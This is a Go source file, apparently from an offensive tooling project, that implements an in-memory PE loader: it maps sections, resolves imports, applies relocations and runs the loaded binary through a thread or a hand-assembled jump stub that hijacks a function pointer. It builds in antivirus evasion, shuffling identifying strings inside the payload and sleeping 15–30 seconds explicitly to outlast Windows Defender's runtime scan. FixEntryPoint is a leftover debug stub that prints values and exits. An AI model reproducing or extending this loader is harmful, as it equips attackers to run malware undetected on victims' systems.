package lib

import (
	"bytes"
	"debug/pe"
	"encoding/hex"
	"fmt"
	"os"
	"regexp"
	"time"
	. "unsafe"

	log "github.com/sirupsen/logrus"
)

func ParsePEHeaders(bin BinAPI) {
	bin.FillFileHeader()
	bin.FillOptionalHeader()
}

func CopyHeaders(api WinAPI, start, dst BinAPI) {
	api.Memcopy(start.GetAddr(), dst.GetAddr(), uintptr(start.GetHeaderSize()))
}

func RegisterNewSection(binary BinAPI, originalSection *pe.SectionHeader32) {
	trimmedName := bytes.Trim(originalSection.Name[:], "\x00")
	section := Section{
		Name:    string(trimmedName),
		Address: Pointer(binary.GetAddr() + uintptr(originalSection.VirtualAddress)),
		RVA:     uintptr(originalSection.VirtualAddress),
		RRA:     uintptr(originalSection.PointerToRawData),
		Size:    uint(originalSection.VirtualSize),
		MemFlag: uint8(originalSection.Characteristics >> 24),
	}
	binary.AddSection(section)
}

func ReplaceWord(bin BinAPI, word string) {
	newWord := shuffle(word)
	re := regexp.MustCompile("(?i)" + utf16LeStr(word))
	bin.UpdateData(re.ReplaceAll(bin.GetData(), utf16Le(newWord)))

	re2 := regexp.MustCompile("(?i)" + word)
	bin.UpdateData(re2.ReplaceAll(bin.GetData(), []byte(newWord)))

	log.Debugf("Replacing %s with %s", word, newWord)
}

func CopySections(api WinAPI, src, dst BinAPI) {
	numSections := src.GetNumSections()
	nextSection := uint(0)

	for i := uint(0); i < numSections; i++ {
		offsetSection := src.GetSizeOptionalHeader() + uintptr(nextSection)
		section := (*pe.SectionHeader32)(ptrOffset(src.GetOptionalHeader(), offsetSection))
		RegisterNewSection(dst, section)
		finalVA := dst.GetAddr() + uintptr(section.VirtualAddress)
		baseRaw := src.GetAddr() + uintptr(section.PointerToRawData)

		log.Debugf("Copying section %s (%d) to 0x%x", string(section.Name[:]), section.SizeOfRawData, finalVA)

		api.Memcopy(baseRaw, finalVA, uintptr(section.SizeOfRawData))

		nextSection += uint(Sizeof(*section))
	}
}

func LoadLibraries(api WinAPI, bin BinAPI) (err error) {
	importAddress := bin.GetFirstImport()
	for i := 0; ; i++ {
		if importAddress.Name == 0 {
			break
		}
		ptrLibraryName := bin.GetAddr() + uintptr(importAddress.Name)
		libraryName := api.CstrVal(Pointer(ptrLibraryName))
		ptrLibrary, err := api.LoadLibrary(string(libraryName[:]))
		if err != nil {
			return fmt.Errorf("Could not load %s - %s", string(libraryName[:]), err)
		}
		log.Debugf("Loaded library %s at 0x%x", string(libraryName[:]), ptrLibrary)
		bin.AddModule(ptrLibrary, string(libraryName[:]), importAddress)
		importAddress = (*ImageImportDescriptor)(ptrOffset(Pointer(importAddress), Sizeof(*importAddress)))
	}
	return nil
}

func LoadFunction(api WinAPI, bin BinAPI, module Module) (err error) {
	var ptrName Pointer
	var funcName string

	offsetFirstThunk := uintptr(module.FirstThunkRVA)
	offsetOriginalfirstThunk := uintptr(module.OriginalFirstThunkRVA)
	for {
		firstThunk := (*ImageThunkData)(Pointer(bin.GetAddr() + offsetFirstThunk))
		originalfirstThunk := (*OriginalImageThunkData)(Pointer(bin.GetAddr() + offsetOriginalfirstThunk))
		if firstThunk.AddressOfData == 0 {
			break
		}
		if isMSBSet(originalfirstThunk.Ordinal) {
			ptrName, funcName = parseOrdinal(originalfirstThunk.Ordinal)
		} else {
			ptrName, funcName = parseFuncAddress(api, bin.GetAddr(), firstThunk.AddressOfData)
		}
		funcAddr, err := api.GetProcAddress(module.Address, ptrName)
		if err != nil {
			return err
		}
		log.Debugf("Imported function %s at 0x%x (%s)", funcName, funcAddr, module.Name)
		firstThunk.AddressOfData = funcAddr

		offsetFirstThunk += Sizeof(uintptr(0))
		offsetOriginalfirstThunk += Sizeof(uintptr(0))
		bin.AddFunction(funcAddr, funcName, &module)
	}
	return err
}

func LoadFunctions(api WinAPI, bin BinAPI) (err error) {
	for _, module := range bin.GetModules() {
		err = LoadFunction(api, bin, module)
		if err != nil {
			return err
		}
	}
	return err
}

func FixImageRelocations(api WinAPI, bin BinAPI, ptrRelocations *ImageBaseRelocation, numEntries, diffOffset uintptr) {
	firstReloc := (*ImageReloc)(ptrOffset(Pointer(ptrRelocations), Sizeof(*ptrRelocations)))
	ptrReloc := Pointer(bin.GetAddr() + uintptr(ptrRelocations.VirtualAddress))

	var ptrFirstReloc Pointer

	for i := uintptr(0); i < numEntries-1; i++ {
		ptrFirstReloc = ptrOffset(ptrReloc, uintptr(firstReloc.GetOffset()))
		//fmt.Printf("Reloc from %x - ", *(*uintptr)(ptrFirstReloc))

		if firstReloc.GetType() == IMAGE_REL_BASED_DIR64 {
			api.Incr64(ptrFirstReloc, uint64(diffOffset))
		} else if firstReloc.GetType() == IMAGE_REL_BASED_HIGHLOW {
			api.Incr32(ptrFirstReloc, uint32(diffOffset))
		} else if firstReloc.GetType() == IMAGE_REL_BASED_HIGH {
			api.Incr16(ptrFirstReloc, uint16(diffOffset>>16))
		} else if firstReloc.GetType() == IMAGE_REL_BASED_LOW {
			api.Incr16(ptrFirstReloc, uint16(diffOffset))
		}
		//fmt.Printf(" to %x\n", *(*uintptr)(ptrFirstReloc))
		firstReloc = (*ImageReloc)(ptrOffset(Pointer(firstReloc), Sizeof(ImageReloc{})))
		//fmt.Printf("%x %x\n", firstReloc.GetType(), firstReloc.GetOffset())
	}
}

func FixRelocations(api WinAPI, bin BinAPI) {
	diffOffset := bin.GetAddr() - bin.GetImageBase()
	ptrRelocations := bin.GetRelocAddr()

	for {
		if uintptr(ptrRelocations.SizeOfBlock) < Sizeof(*ptrRelocations) {
			break
		}

		numEntries := (uintptr(ptrRelocations.SizeOfBlock) - Sizeof(*ptrRelocations)) / Sizeof(ImageReloc{})
		log.Infof("Will fix %d relocations", numEntries)
		FixImageRelocations(api, bin, ptrRelocations, numEntries, diffOffset)

		ptrRelocations = (*ImageBaseRelocation)(ptrOffset(Pointer(ptrRelocations), uintptr(ptrRelocations.SizeOfBlock)))
	}

}

func UpdateSectionProtections(api WinAPI, bin BinAPI) (err error) {
	var execFlag, writeFlag bool
	for _, section := range bin.GetSections() {
		execFlag = section.MemFlag&0x20 == 0x20
		writeFlag = section.MemFlag&0x80 == 0x80
		log.Debugf("Updating %s (%x) mem privileges: exec: %t, write: %t", section.Name, section.Address, execFlag, writeFlag)
		err = api.VirtualProtect(ptrValue(section.Address), uintptr(section.Size), execFlag, writeFlag)
		if err != nil {
			return err
		}
	}
	return nil
}

func FixOffsetsInSection(api WinAPI, bin BinAPI, section Section) {
	var rDataptr Pointer
	offset := section.RVA
	oldBaseAddress := bin.GetImageBase()

	for i := uintptr(0); i < uintptr(section.Size); i += Sizeof(uint(0)) {
		rDataptr = ptrOffset(Pointer(bin.GetAddr()), offset+i)
		val := *(*uintptr)(rDataptr)

		if val&oldBaseAddress == oldBaseAddress && val-oldBaseAddress < 0xFFFF {
			*(*uintptr)(rDataptr) = val - oldBaseAddress + bin.GetAddr()
			log.Debugf("%s: Updated from %x to %x at %x", section.Name, val, *(*uintptr)(rDataptr), rDataptr)
		}
	}
}

func FixingHardcodedOffsets(api WinAPI, bin BinAPI) {
	for _, section := range bin.GetSections() {
		FixOffsetsInSection(api, bin, section)
	}
}

func FixEntryPoint(api WinAPI, bin BinAPI) (err error) {
	clrHeader := bin.GetCLRHeader()
	fmt.Printf("%x\n", clrHeader)
	fmt.Printf("%x", *(*uint64)(Pointer(bin.GetAddr() + uintptr(clrHeader.EntryPointRVA))))

	os.Exit(0)
	return nil
}

func StartThreadWait(api WinAPI, bin BinAPI, sleep bool) (err error) {

	entryPoint := bin.GetEntryPoint()
	log.Infof("Getting entry point %x", entryPoint)
	//api.NtFlushInstructionCache(bin.GetAddr(), bin.GetImageBase())

	r1, err := api.CreateThread(entryPoint)
	if err != nil {
		return err
	}

	if sleep {
		log.Infof("Waiting a few seconds to avoid runtime scan")
		time.Sleep(time.Duration(randInt(15, 30)) * time.Second) // Windows Defender gives up after 15 seconds
	}

	api.ResumeThread(r1)
	api.WaitForSingleObject(r1)
	api.CloseHandle(r1)

	return nil
}

func PrepareJumper(api WinAPI, entryPoint Pointer) (Pointer, error) {
	// movabs r13, entrypoint
	// jmp r13
	opcode := fmt.Sprintf("49Bd%x41ffe5", formatPtr(entryPoint))

	sc, err := hex.DecodeString(opcode)
	if err != nil {
		return nil, err
	}
	addr, err := api.VirtualAlloc(uint(len(sc)))
	if err != nil {
		return nil, err
	}
	err = api.UpdateExecMemory(ptrValue(addr), sc)

	return addr, err
}

func ExecuteInFunction(api WinAPI, bin BinAPI) (err error) {
	f := func() {}
	entryPoint := bin.GetEntryPoint()
	addr, err := PrepareJumper(api, entryPoint)
	if err != nil {
		return err
	}

	log.Debugf("Prepared stub at 0x%x to jump to entry point 0x%x", addr, entryPoint)
	if err = api.VirtualProtect(*(*uintptr)(Pointer(&f)), Sizeof(uintptr(0)), false, true); err != nil {
		return err
	}

	**(**uintptr)(Pointer(&f)) = (uintptr)(addr)
	log.Debugf("Overwrote function address at 0x%x with stub address 0x%x", *(*uintptr)(Pointer(&f)), addr)
	log.Infof("Executing function at 0x%x", *(*uintptr)(Pointer(&f)))

	f()

	return nil
}
